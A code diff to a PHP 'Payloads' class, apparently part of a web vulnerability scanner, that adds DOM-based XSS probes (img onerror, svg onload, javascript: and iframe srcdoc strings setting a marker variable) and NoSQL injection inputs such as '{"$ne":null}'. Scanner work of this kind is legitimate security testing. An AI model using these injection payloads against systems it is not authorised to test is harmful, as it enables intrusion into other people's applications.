@@ -20,6 +20,8 @@ final class Payloads
             'sqli_error' => self::sqliError(),
             'traversal' => self::traversal(),
             'graphql' => self::graphql(),
+            'dom_xss' => self::domXss($context['token'] ?? self::marker('EGIDEDOM')),
+            'nosql' => self::noSql(),
             default => [],
         };
     }
@@ -72,5 +74,28 @@ final class Payloads
     private static function graphql(): array
     {
         return [['value' => '{__schema{queryType{name} types{name}}}', 'oracle' => 'graphqlAssess', 'marker' => null]];
+    }
+
+    private static function domXss(string $token): array
+    {
+        $set = "window.__EGIDE_XSS='".$token."'";
+
+        return array_map(fn ($value) => ['value' => $value, 'oracle' => 'domXssAssess', 'marker' => $token], [
+            '"><img src=x onerror="'.$set.'">',
+            '"><svg onload="'.$set.'">',
+            "'><img src=x onerror=".$set.'>',
+            'javascript:'.$set,
+            '<iframe srcdoc="&lt;img src=x onerror='.$set.'&gt;">',
+        ]);
+    }
+
+    private static function noSql(): array
+    {
+        return array_map(fn ($value) => ['value' => $value, 'oracle' => 'noSqlAssess', 'marker' => null], [
+            '{"$ne":null}',
+            '{"$gt":""}',
+            "'; return true; var _='",
+            '[$ne]=x',
+        ]);
     }
 }
